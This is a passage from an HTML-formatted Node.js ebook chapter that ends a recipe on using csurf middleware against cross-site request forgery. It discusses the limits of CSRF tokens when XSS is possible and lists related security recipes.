<strong class="bold"><span class="koboSpan" id="kobo.2224.1">          value="r3AByUA1-csl3hIjrE3J4fB6nRoBT8GCr9YE"&gt;</span></strong><span class="koboSpan" id="kobo.2225.1">
        &lt;input name="email" value="beth@example.com"&gt;
        &lt;input type="submit" value="Update"&gt;
      &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.2226.1">
       You should be able to update the email
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.2227.1">
        as before.
       </span>
      </span>
     </p>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.2228.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2229.1">
      csurf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2230.1">
     middleware helps mitigate the risk of CSRF attacks in older browsers that don’t support the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2231.1">
      Set-Cookie:SameSite
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2232.1">
     attribute.
    </span>
    <span class="koboSpan" id="kobo.2232.2">
     However, our servers could still be vulnerable to more complex CSRF attacks, even when using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2233.1">
      csurf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2234.1">
     middleware.
    </span>
    <span class="koboSpan" id="kobo.2234.2">
     The attacker could use XSS to obtain the CSRF token, and then craft a CSRF attack using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.2235.1">
      _csrf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.2236.1">
     token.
    </span>
    <span class="koboSpan" id="kobo.2236.2">
     However, this is best-effort mitigation in the absence of support for the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.2237.1">
       Set-Cookie:SameSite
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2238.1">
      attribute.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.2239.1">
     Slowing an attacker down by making the attack they have to create more complex is an effective way of reducing risk.
    </span>
    <span class="koboSpan" id="kobo.2239.2">
     Many attackers will try to exploit many websites at a time – if they experience a website that takes significantly longer to exploit, in the interest of time, they will often
    </span>
    <a id="_idIndexMarker780">
    </a>
    <span class="koboSpan" id="kobo.2240.1">
     just move on to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.2241.1">
      another website.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-310">
    <a id="_idTextAnchor317">
    </a>
    <span class="koboSpan" id="kobo.2242.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.2243.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2244.1">
       Authentication with Fastify
      </span>
     </em>
     <span class="koboSpan" id="kobo.2245.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2246.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2247.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2248.1">
       Hardening headers with Helmet
      </span>
     </em>
     <span class="koboSpan" id="kobo.2249.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2250.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2251.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2252.1">
       Anticipating malicious input
      </span>
     </em>
     <span class="koboSpan" id="kobo.2253.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2254.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2255.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2256.1">
       Preventing JSON pollution
      </span>
     </em>
     <span class="koboSpan" id="kobo.2257.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2258.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2259.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2260.1">
       Guarding against cross-site scripting
      </span>
     </em>
     <span class="koboSpan" id="kobo.2261.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.2262.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.2263.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.2264.1">
       Diagnosing issues with Chrome DevTools
      </span>
     </em>
     <span class="koboSpan" id="kobo.2265.1">
      recipe in
     </span>
     <a href="B19212_12.xhtml#_idTextAnchor388">
      <span class="No-Break">
       <em class="italic">
        <span class="koboSpan" id="kobo.2266.1">
         Chapter 12
        </span>
       </em>
      </span>
     </a>
    </li>
   </ul>
  </div>
 </body></html>